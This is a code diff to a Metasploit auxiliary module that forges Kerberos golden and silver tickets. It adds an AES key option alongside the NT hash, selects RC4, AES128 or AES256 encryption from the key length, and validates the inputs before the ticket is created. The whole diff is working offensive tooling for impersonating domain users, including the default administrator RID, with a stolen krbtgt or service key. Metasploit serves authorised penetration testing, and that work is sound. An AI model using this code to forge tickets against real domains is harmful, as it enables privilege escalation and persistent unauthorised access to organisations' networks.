@@ -42,7 +42,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('USER', [ true, 'The Domain User' ]),
         OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
-        OptString.new('NTHASH', [ true, 'The krbtgt/service nthash' ]),
+        OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
+        OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
         OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
         OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
         OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], regex: %r{.*/.*}),
@@ -55,7 +56,21 @@ class MetasploitModule < Msf::Auxiliary
   SECS_IN_DAY = 60 * 60 * 24
 
   def run
-    enc_key = [datastore['NTHASH']].pack('H*')
+    validate_options
+
+    if datastore['NTHASH']
+      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
+      key = datastore['NTHASH']
+    else
+      key = datastore['AES_KEY']
+      if datastore['AES_KEY'].size == 64
+        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256
+      else
+        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128
+      end
+    end
+
+    enc_key = [key].pack('H*')
     start_time = Time.now
     end_time = start_time + SECS_IN_DAY * datastore['DURATION']
 
@@ -72,6 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     create_ticket(
       enc_key: enc_key,
+      enc_type: enc_type,
       start_time: start_time,
       end_time: end_time,
       sname: sname,
@@ -83,4 +99,21 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
+  private
+
+  def validate_options
+    if datastore['NTHASH'].blank? && datastore['AES_KEY'].blank?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH or AES_KEY must be set for forging a ticket')
+    elsif datastore['NTHASH'].present? && datastore['AES_KEY'].present?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH and AES_KEY may not both be set for forging a ticket')
+    end
+
+    if datastore['NTHASH'].present? && datastore['NTHASH'].size != 32
+      fail_with(Msf::Exploit::Failure::BadConfig, "NTHASH length was #{datastore['NTHASH'].size} should be 32")
+    end
+
+    if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)
+      fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
+    end
+  end
 end
